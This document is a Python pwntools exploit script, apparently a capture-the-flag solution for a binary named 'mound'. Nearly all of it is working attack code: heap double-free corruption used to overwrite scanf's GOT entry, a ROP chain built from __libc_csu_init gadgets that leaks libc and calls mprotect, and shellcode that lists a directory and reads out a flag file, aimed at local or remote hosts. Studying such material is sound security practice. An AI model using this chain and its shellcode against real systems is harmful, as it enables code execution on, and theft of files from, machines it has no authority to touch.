from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './mound'
HOST = '193.57.159.27'
PORT = 31978

HOST = '172.17.0.2'
PORT = 8888

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET, aslr=False)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def raw_alloc(data, idx):
	r.sendlineafter('> ', '1')
	r.sendafter(': ', data)
	r.sendlineafter(': ', str(idx))

def a(data, idx, size=-1):
	r.sendlineafter('> ', '2')
	if size == -1:
		r.sendlineafter(': ', str(len(data)))
	else:
		r.sendlineafter(': ', str(size))
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', data)

def e(idx, data):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', data)
	
def d(idx):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ', str(idx))

raw_alloc('A'*0x17, 0)
# id: 'A'*7
raw_alloc('a'*0x17, 1)
d(1)

# double free like tcache poisoning
e(0, 'B'*0x17)
# new id: 'B'*7
d(1)

# point manage area
a(flat(0x00000beef0000010, 0xdead0008008-0x10), 2)

if args.D:
	# debug(r, [0x14a2, 0x1351])
	# debug(r, [0x13f2])
	# debug(r, [0x1263])
	debug(r, [0x1823])
a('D'*8, 3)

# overwrite bottom, top pointer
a(flat(0x4041c0, elf.got.__isoc99_scanf-0x10), 4)

# destory got with calling top_chunk_alloc 
# overwrite scanf -> win
a(flat(elf.sym.win), 5, 0x30)

# trivial part
rdi = 0x00401e8b
rbp = 0x004011f9
leave = 0x004012f7

'''
  401e68:       4c 89 f2                mov    rdx,r14
  401e6b:       4c 89 ee                mov    rsi,r13
  401e6e:       44 89 e7                mov    edi,r12d
  401e71:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
  401e75:       48 83 c3 01             add    rbx,0x1
  401e79:       48 39 dd                cmp    rbp,rbx
  401e7c:       75 ea                   jne    401e68 <__libc_csu_init+0x38>
  401e7e:       48 83 c4 08             add    rsp,0x8
  401e82:       5b                      pop    rbx
  401e83:       5d                      pop    rbp
  401e84:       41 5c                   pop    r12
  401e86:       41 5d                   pop    r13
  401e88:       41 5e                   pop    r14
  401e8a:       41 5f                   pop    r15
  401e8c:       c3                      ret
'''

csu_load = 0x401e82
csu_exec = 0x401e68

payload = ''
payload += 'A'*0x48
payload += flat(rdi, elf.got.puts, elf.plt.puts, csu_load)
payload += flat(0, 1, 0, 0xbeef0000000+8, 0x1000, elf.got.read, csu_exec, 0xdeadbeef)
payload += flat(1,2,3,4,5,6)
payload += flat(rbp, 0xbeef0000000, leave)
payload = payload.ljust(0x1000, '\x00')

r.sendafter(';)\n', payload)
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak - 0x875a0
mprotect = base + 0x11bb00
rsi = base + 0x001507db
rdx_p1 = base + 0x0011c371

payload = ''
payload += flat(rdi, 0xbeef0000000, rsi, 0x1000, rdx_p1, 7, 0xdeadbeef, mprotect, 0xbeef0000000+0x50)

buf = 0xbeef0000000 + 0x800
sc = ''
sc += asm('''
        xor rax, rax
        mov rdi, 0
        mov rsi, {}
        mov rdx, 0x100
        syscall

        mov rax, 257
       	mov rdi, -100
        mov rsi, {}
	xor rdx, rdx
        mov r10, 0x200000
        syscall

        mov rdi, rax
        mov rsi, {}
        mov rdx, 0x400
        mov rax, 217
        syscall

        mov rax, 1
        mov rdi, 1
        mov rsi, {}
        mov rdx, 0x400
        syscall

        xor rax, rax
        mov rdi, 0
        mov rsi, {}
        mov rdx, 0x1000
        syscall

'''.format(buf, buf, buf, buf, buf-0x800))

payload += sc
payload = payload.ljust(0x1000, '\x00')
r.send(payload)

sleep(0.1)
r.send("/pwn\x00")
ret = r.recv(0x400).split('\x00')
for s in ret:
	if ".txt" in s:
		name = "/pwn/"+s[1:]
		break

sc = ''
sc += asm('''
        xor rax, rax
        mov rdi, 0
        mov rsi, {}
        mov rdx, 0x100
        syscall

        mov rax, 257
       	mov rdi, -100
        mov rsi, {}
	xor rdx, rdx
        mov r10, 0
        syscall

        mov rdi, rax
        mov rsi, {}
        mov rdx, 0x400
        mov rax, 0
        syscall

        mov rax, 1
        mov rdi, 1
        mov rsi, {}
        mov rdx, 0x400
        syscall

	xor edi, edi
        mov rax, 0x3c
        syscall

'''.format(buf, buf, buf, buf))

payload = ''
payload += '\xcc'*0xec
payload += sc
payload = payload.ljust(0x1000, '\x00')
r.send(payload)
r.send(name.ljust(0x100, '\x00'))
r.interactive()
r.close()
